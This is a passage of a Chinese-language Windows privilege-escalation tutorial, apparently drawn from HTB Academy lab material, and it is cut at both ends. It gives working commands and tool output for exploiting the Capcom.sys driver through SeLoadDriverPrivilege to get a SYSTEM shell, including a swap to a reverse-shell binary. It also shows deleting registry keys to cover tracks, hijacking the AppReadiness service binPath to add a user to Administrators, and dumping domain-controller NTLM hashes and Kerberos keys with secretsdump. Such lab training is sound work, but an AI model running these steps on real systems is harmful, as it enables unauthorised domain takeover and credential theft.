class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span>.  <span class="title">All</span> <span class="title">rights</span> <span class="title">reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/<span class="title">out:EnableSeLoadDriverPrivilege</span>.<span class="title">exe</span></span></span><br><span class="line"><span class="function"><span class="title">EnableSeLoadDriverPrivilege.obj</span></span></span><br></pre></td></tr></table></figure>

<p>接下来，从<a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">此处</a>下载驱动程序，并将其保存到<code>C:\temp</code>。发出以下命令以在 HKEY_CURRENT_USER 树下添加对此驱动程序的引用。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">add</span> <span class="title">HKCU</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">CAPCOM</span> /<span class="title">v</span> <span class="title">ImagePath</span> /<span class="title">t</span> <span class="title">REG_SZ</span> /<span class="title">d</span> &quot;\??\<span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Capcom.sys</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">reg</span> <span class="title">add</span> <span class="title">HKCU</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">CAPCOM</span> /<span class="title">v</span> <span class="title">Type</span> /<span class="title">t</span> <span class="title">REG_DWORD</span> /<span class="title">d</span> 1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<p>运行 <code>EnableSeLoadDriverPrivilege.exe</code></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">EnableSeLoadDriverPrivilege.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">whoami</span>:</span></span><br><span class="line"><span class="function"><span class="title">INLANEFREIGHT0</span>\<span class="title">printsvc</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"><span class="title">SeMachineAccountPrivilege</span>        <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeLoadDriverPrivilege</span>            <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeShutdownPrivilege</span>              <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>          <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span></span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span>    <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span>: 00000000, <span class="title">WinError</span>: 0</span></span><br></pre></td></tr></table></figure>

<p>验证 Capcom 驱动程序是否已列出。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\DriverView.exe /stext drivers.txt</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cat</span> drivers.txt | <span class="built_in">Select-String</span> <span class="literal">-pattern</span> Capcom</span><br><span class="line"></span><br><span class="line">Driver Name           : Capcom.sys</span><br><span class="line">Filename              : C:\Capcom.sys</span><br></pre></td></tr></table></figure>

<p>为了利用 Capcom.sys，可以用 Visual Studio 编译后使用<a target="_blank" rel="noopener" href="https://github.com/tandasat/ExploitCapcom">ExploitCapcom工具。</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\ExploitCapcom.exe</span><br><span class="line"></span><br><span class="line">[*] Capcom.sys exploit</span><br><span class="line">[*] Capcom.sys handle was obained as <span class="number">0000000000000070</span></span><br><span class="line">[*] Shellcode was placed at <span class="number">0000024822</span>A50008</span><br><span class="line">[+] Shellcode was executed</span><br><span class="line">[+] Token stealing was successful</span><br><span class="line">[+] The SYSTEM shell was launched</span><br></pre></td></tr></table></figure>

<p>这将启动具有 SYSTEM 权限的 shell</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/capcomexploit.png" alt="capcomexploit"></p>
<h3 id="替代利用-无GUI"><a href="#替代利用-无GUI" class="headerlink" title="替代利用-无GUI"></a>替代利用-无GUI</h3><p>如果无法通过 GUI 访问目标，则必须在编译之前修改<code>ExploitCapcom.cpp</code>代码。在这里，可以编辑第 292 行，并将其<code>&quot;C:\Windows\\system32\\cmd.exe&quot;</code>替换为<code>msfvenom</code>创建的反向 shell 二进制文件，例如：<code>c:\ProgramData\revshell.exe</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Launches a command shell process</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">LaunchShell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    TCHAR CommandLine[] = TEXT(<span class="string">&quot;C:\Windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line">    PROCESS_INFORMATION ProcessInfo;</span><br><span class="line">    STARTUPINFO StartupInfo = &#123; <span class="keyword">sizeof</span>(StartupInfo) &#125;;</span><br><span class="line">    <span class="keyword">if</span> (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,</span><br><span class="line">        CREATE_NEW_CONSOLE, nullptr, nullptr, &amp;StartupInfo,</span><br><span class="line">        &amp;ProcessInfo))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(ProcessInfo.hThread);</span><br><span class="line">    CloseHandle(ProcessInfo.hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更改为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCHAR CommandLine[] = TEXT(<span class="string">&quot;C:\ProgramData\\revshell.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="EopLoadDriver-自动化"><a href="#EopLoadDriver-自动化" class="headerlink" title="EopLoadDriver 自动化"></a>EopLoadDriver 自动化</h3><p><a target="_blank" rel="noopener" href="https://github.com/TarlogicSecurity/EoPLoadDriver/">EoPLoadDriver</a>工具可以自动执行启用特权、创建注册表项以及执行<code>NTLoadDriver</code>加载驱动程序的过程。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">EoPLoadDriver.exe</span> <span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Capcom</span> <span class="title">c</span>:\<span class="title">Tools</span>\<span class="title">Capcom.sys</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Enabling</span> <span class="title">SeLoadDriverPrivilege</span></span></span><br><span class="line"><span class="function">[+] <span class="title">SeLoadDriverPrivilege</span> <span class="title">Enabled</span></span></span><br><span class="line"><span class="function">[+] <span class="title">Loading</span> <span class="title">Driver</span>: \<span class="title">Registry</span>\<span class="title">User</span>\<span class="title">S</span>-1-5-21-454284637-3659702366-2958135535-1103\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Capcom</span></span></span><br><span class="line"><span class="function"><span class="title">NTSTATUS</span>: <span class="title">c000010e</span>, <span class="title">WinError</span>: 0</span></span><br></pre></td></tr></table></figure>

<p>然后将运行<code>ExploitCapcom.exe</code>弹出 SYSTEM shell 或运行自定义二进制文件。</p>
<h3 id="Clean-1"><a href="#Clean-1" class="headerlink" title="Clean"></a>Clean</h3><p>通过删除之前添加的注册表项来掩盖踪迹。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">delete</span> <span class="title">HKCU</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Capcom</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Permanently</span> <span class="title">delete</span> <span class="title">the</span> <span class="title">registry</span> <span class="title">key</span> <span class="title">HKEY_CURRENT_USER</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Capcom</span> (<span class="title">Yes</span>/<span class="title">No</span>)? <span class="title">Yes</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：自 Windows 10 版本 1803 起，SeLoadDriverPrivilege 不可利用，因为不再可能包含对  HKEY_CURRENT_USER 下注册表项的引用。</p>
</blockquote>
<h2 id="Server-Operators"><a href="#Server-Operators" class="headerlink" title="Server Operators"></a>Server Operators</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators">服务器操作员</a>组允许成员管理 Windows 服务器，而无需分配域管理员权限。这是一个具有极高权限的组，可以本地登录到服务器，包括域控制器。</p>
<p>该团体的成员享有强大的<code>SeBackupPrivilege</code>特权<code>SeRestorePrivilege</code>和控制本地服务的能力。</p>
<p>检查一下该<code>AppReadiness</code>服务</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">qc</span> <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 20  <span class="title">WIN32_SHARE_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 3   <span class="title">DEMAND_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">svchost.exe</span> -<span class="title">k</span> <span class="title">AppReadiness</span> -<span class="title">p</span></span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">App</span> <span class="title">Readiness</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span></span></span><br></pre></td></tr></table></figure>

<p>也可以使用服务查看器&#x2F;控制器<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice">PsService</a>（Sysinternals 套件的一部分）来检查服务的权限。<code>PsService</code>其工作原理与<code>sc</code>非常相似，可以显示服务状态和配置，还允许您在本地和远程主机上启动、停止、暂停、恢复和重新启动服务。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">c</span>:\<span class="title">Tools</span>\<span class="title">PsService.exe</span> <span class="title">security</span> <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PsService</span> <span class="title">v2</span>.25 - <span class="title">Service</span> <span class="title">information</span> <span class="title">and</span> <span class="title">configuration</span> <span class="title">utility</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2001-2010 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function"><span class="title">DISPLAY_NAME</span>: <span class="title">App</span> <span class="title">Readiness</span></span></span><br><span class="line"><span class="function">        <span class="title">ACCOUNT</span>: <span class="title">LocalSystem</span></span></span><br><span class="line"><span class="function">        <span class="title">SECURITY</span>:</span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">status</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">Config</span></span></span><br><span class="line"><span class="function">                <span class="title">Interrogate</span></span></span><br><span class="line"><span class="function">                <span class="title">Enumerate</span> <span class="title">Dependents</span></span></span><br><span class="line"><span class="function">                <span class="title">Pause</span>/<span class="title">Resume</span></span></span><br><span class="line"><span class="function">                <span class="title">Start</span></span></span><br><span class="line"><span class="function">                <span class="title">Stop</span></span></span><br><span class="line"><span class="function">                <span class="title">User</span>-<span class="title">Defined</span> <span class="title">Control</span></span></span><br><span class="line"><span class="function">                <span class="title">Read</span> <span class="title">Permissions</span></span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">                <span class="title">All</span></span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">status</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">Config</span></span></span><br><span class="line"><span class="function">                <span class="title">Interrogate</span></span></span><br><span class="line"><span class="function">                <span class="title">Enumerate</span> <span class="title">Dependents</span></span></span><br><span class="line"><span class="function">                <span class="title">User</span>-<span class="title">Defined</span> <span class="title">Control</span></span></span><br><span class="line"><span class="function">                <span class="title">Read</span> <span class="title">Permissions</span></span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SERVICE</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">status</span></span></span><br><span class="line"><span class="function">                <span class="title">Query</span> <span class="title">Config</span></span></span><br><span class="line"><span class="function">                <span class="title">Interrogate</span></span></span><br><span class="line"><span class="function">                <span class="title">Enumerate</span> <span class="title">Dependents</span></span></span><br><span class="line"><span class="function">                <span class="title">User</span>-<span class="title">Defined</span> <span class="title">Control</span></span></span><br><span class="line"><span class="function">                <span class="title">Read</span> <span class="title">Permissions</span></span></span><br><span class="line"><span class="function">        [<span class="title">ALLOW</span>] <span class="title">BUILTIN</span>\<span class="title">Server</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">                <span class="title">All</span></span></span><br></pre></td></tr></table></figure>

<p>更改二进制路径来执行一个命令，将当前用户添加到默认本地管理员组。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">config</span> <span class="title">AppReadiness</span> <span class="title">binPath</span>= &quot;<span class="title">cmd</span> /<span class="title">c</span> <span class="title">net</span> <span class="title">localgroup</span> <span class="title">Administrators</span> <span class="title">server_adm</span> /<span class="title">add</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">ChangeServiceConfig</span> <span class="title">SUCCESS</span></span></span><br></pre></td></tr></table></figure>

<p>启动服务失败，这是预料之中的。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">start</span> <span class="title">AppReadiness</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">StartService</span> <span class="title">FAILED</span> 1053:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">service</span> <span class="title">did</span> <span class="title">not</span> <span class="title">respond</span> <span class="title">to</span> <span class="title">the</span> <span class="title">start</span> <span class="title">or</span> <span class="title">control</span> <span class="title">request</span> <span class="title">in</span> <span class="title">a</span> <span class="title">timely</span> <span class="title">fashion</span>.</span></span><br></pre></td></tr></table></figure>

<p>检查管理员组的成员身份，会发现用户加入了管理员组。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span> <span class="title">Administrators</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Alias</span> <span class="title">name</span>     <span class="title">Administrators</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Administrators</span> <span class="title">have</span> <span class="title">complete</span> <span class="title">and</span> <span class="title">unrestricted</span> <span class="title">access</span> <span class="title">to</span> <span class="title">the</span> <span class="title">computer</span>/<span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">Enterprise</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">server_adm</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<p>从这里，可以完全控制域控制器，可以从 NTDS 数据库检索所有凭据并访问其他系统，并执行后利用任务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.129.43.9 -u server_adm -p &#x27;HTB_@cademy_stdnt!&#x27;</span><br><span class="line"></span><br><span class="line">SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p>从域控制器检索 NTLM 密码哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator</span><br><span class="line"></span><br><span class="line">Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a</span><br><span class="line">Administrator:des-cbc-md5:d60dfbbf20548938</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="User-Account-Control"><a href="#User-Account-Control" class="headerlink" title="User Account Control"></a>User Account Control</h1><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">用户帐户控制 (UAC)</a>是一种功能，可针对高级活动启用同意提示。应用程序有不同的<code>integrity</code>级别，具有高级别的程序可以执行可能危害系统的任务。启用 UAC 后，应用程序和任务始终在非管理员帐户的安全上下文中运行，除非管理员明确授权这些应用程序&#x2F;任务以管理员级别的权限运行系统。</p>
<table>
<thead>
<tr>
<th>组策略设置</th>
<th>注册表项</th>
<th>默认设置</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account">用户帐户控制：内置管理员帐户的管理员批准模式</a></td>
<td>FilterAdministratorToken</td>
<td>已禁用</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop">用户帐户控制：允许 UIAccess 应用程序在不使用安全桌面的情况下提示提升权限</a></td>
<td>EnableUIADesktopToggle</td>
<td>已禁用</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode">用户帐户控制: 管理员批准模式下管理员的提升权限提示行为</a></td>
<td>ConsentPromptBehaviorAdmin</td>
<td>提示同意非 Windows 二进制文件</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users">用户帐户控制：标准用户的提升提示行为</a></td>
<td>ConsentPromptBehaviorUser</td>
<td>在安全桌面上提示输入凭据</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation">用户帐户控制: 检测应用程序安装并提示提升权限</a></td>
<td>EnableInstallerDetection</td>
<td>已启用（家庭默认） 已禁用（企业默认）</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated">用户帐户控制：仅提升已签名和验证的可执行文件</a></td>
<td>ValidateAdminCodeSignatures</td>
<td>已禁用</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations">用户帐户控制：仅提升安装在安全位置的 UIAccess 应用程序</a></td>
<td>EnableSecureUIAPaths</td>
<td>已启用</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode">用户帐户控制：以管理员批准模式运行所有管理员</a></td>
<td>EnableLUA</td>
<td>已启用</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation">用户帐户控制：提示提升权限时切换到安全桌面</a></td>
<td>PromptOnSecureDesktop</td>
<td>已启用</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations">用户帐户控制：将文件和注册表写入失败虚拟化到每个用户位置</a></td>
<td>EnableVirtualization</td>
<td>已启用</td>
</tr>
</tbody></table>
<p>没有命令行版本的 GUI 同意提示，因此必须绕过 UAC 才能使用特权访问令牌执行命令。</p>
<p>查看 UAC 是否已启用，如果已启用，则启用到什么级别。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">REG</span> <span class="title">QUERY</span> <span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">Software</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">CurrentVersion</span>\<span class="title">Policies</span>\<span class="title">System</span>\ /<span class="title">v</span> <span class="title">EnableLUA</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">Software</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">CurrentVersion</span>\<span class="title">Policies</span>\<span class="title">System</span></span></span><br><span class="line"><span class="function">    <span class="title">EnableLUA</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br></pre></td></tr></table></figure>

<p>检查 UAC 级别</p>
